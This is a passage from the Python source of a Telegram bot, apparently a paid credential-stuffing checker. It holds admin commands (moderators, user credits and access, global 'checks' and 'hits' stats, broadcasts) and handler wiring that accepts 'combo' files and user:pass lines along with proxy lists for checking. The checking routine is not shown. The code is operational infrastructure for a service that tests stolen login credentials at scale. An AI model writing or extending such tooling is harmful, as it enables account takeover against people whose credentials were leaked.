            await reply('✅ Modded `' + str(target) + '`')
        elif cmd == 'unmod' and len(parts) >= 2:
            if uid != ADMIN_ID:
                await reply('❌ Owner only.'); return
            target = int(parts[1])
            db.set_mod(target, 0)
            await reply('✅ Unmodded `' + str(target) + '`')
        elif cmd == 'info' and len(parts) >= 2:
            target = int(parts[1])
            info   = db.get_user_info(target)
            if not info:
                await reply('❌ User `' + str(target) + '` not found'); return
            exp = (info.get('access_expiry','') or '')[:10]
            await reply(
                '👤 *User Info*\n\n'
                'ID:       `' + str(info['user_id']) + '`\n'
                'Username: @' + (info['username'] or 'N/A') + '\n'
                'Name:     ' + (info['first_name'] or 'N/A') + '\n'
                'Credits:  `' + str(info['credits']) + '`\n'
                'Access:   `' + ('Yes' if info['has_access'] else 'No') + '`\n'
                'Banned:   `' + ('Yes' if info['is_banned'] else 'No') + '`\n'
                'Mod:      `' + ('Yes' if info['is_mod'] else 'No') + '`\n'
                'Checks:   `' + str(info['total_checks']) + '`\n'
                'Hits:     `' + str(info['total_hits']) + '`\n'
                'Joined:   `' + (info['join_date'] or '')[:10] + '`\n'
                'Expiry:   `' + (exp or 'None') + '`'
            )
        elif cmd == 'stats':
            s = db.global_stats()
            await reply(
                '📊 *Global Stats*\n\n'
                '👥 Total Users:  `' + str(s['total']) + '`\n'
                '✅ Active:       `' + str(s['active']) + '`\n'
                '🔍 Total Checks: `' + str(s['checks']) + '`\n'
                '🎯 Total Hits:   `' + str(s['hits']) + '`\n'
                '🌐 Proxies:      `' + str(len(PROXIES_LIST)) + '`'
            )
        elif cmd == 'listmods':
            mods = db.list_mods()
            if not mods:
                await reply('No mods found.'); return
            lst = '\n'.join(['• `' + str(m['uid']) + '` @' + (m['username'] or 'N/A') for m in mods])
            await reply('🛡 *Moderators:*\n\n' + lst)
        elif cmd == 'setthreads' and len(parts) >= 3:
            target, n = int(parts[1]), int(parts[2])
            db.update_settings(target, threads=n)
            await reply('✅ Set threads to `' + str(n) + '` for `' + str(target) + '`')
        elif cmd == 'broadcast':
            bcast = txt[len('!!broadcast'):].strip()
            if not bcast:
                await reply('Usage: `!!broadcast your message`'); return
            uids = db.get_all_uids()
            sent = 0
            for tuid in uids:
                try:
                    await c.bot.send_message(
                        tuid,
                        '📢 *Broadcast — ' + TAG + '*\n\n' + bcast,
                        parse_mode='Markdown')
                    sent += 1
                    await asyncio.sleep(0.05)
                except Exception: pass
            await reply('✅ Sent to `' + str(sent) + '/' + str(len(uids)) + '` users')
        else:
            await reply('❌ Unknown command. Use `!!help`')
    except Exception as e:
        await u.message.reply_text('❌ Error: `' + str(e) + '`', parse_mode='Markdown')


# ============================================================================
# Document router (proxy vs combo)
# ============================================================================
async def _route_doc(u: Update, c: ContextTypes.DEFAULT_TYPE):
    cap = (u.message.caption or '').lower()
    if 'prox' in cap or 'proxy' in cap:
        await handle_proxies(u, c)
    else:
        await handle_combo(u, c)


# ============================================================================
# MAIN
# ============================================================================
def bot_main_exec():
    logger.info('Starting AKAZA Bot — ' + TAG)
    db.init_db()
    db.add_user(ADMIN_ID, 'larpsupport', 'Admin')
    db.grant_access(ADMIN_ID)

    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler('start',    start))
    app.add_handler(CommandHandler('threads',  cmd_threads))
    app.add_handler(CommandHandler('keywords', cmd_keywords))
    app.add_handler(CommandHandler('addkw',    cmd_addkw))
    app.add_handler(CommandHandler('clearkw',  cmd_clearkw))
    app.add_handler(CommandHandler('fastmode', cmd_fastmode))
    app.add_handler(CommandHandler('check',    single_check_cmd))
    app.add_handler(CommandHandler('stats',    cmd_stats))
    app.add_handler(CallbackQueryHandler(cb_handler))
    app.add_handler(MessageHandler(filters.TEXT & filters.Regex(r'^!!'), admin_cmd_handler))
    app.add_handler(MessageHandler(filters.Document.FileExtension('txt'), _route_doc))
    app.add_handler(MessageHandler(
        filters.TEXT & ~filters.COMMAND & filters.Regex(r'[^!].+:.+'),
        handle_combo))

    logger.info('Bot polling started')
    app.run_polling(drop_pending_updates=True)


if __name__ == '__main__':
    bot_main_exec()
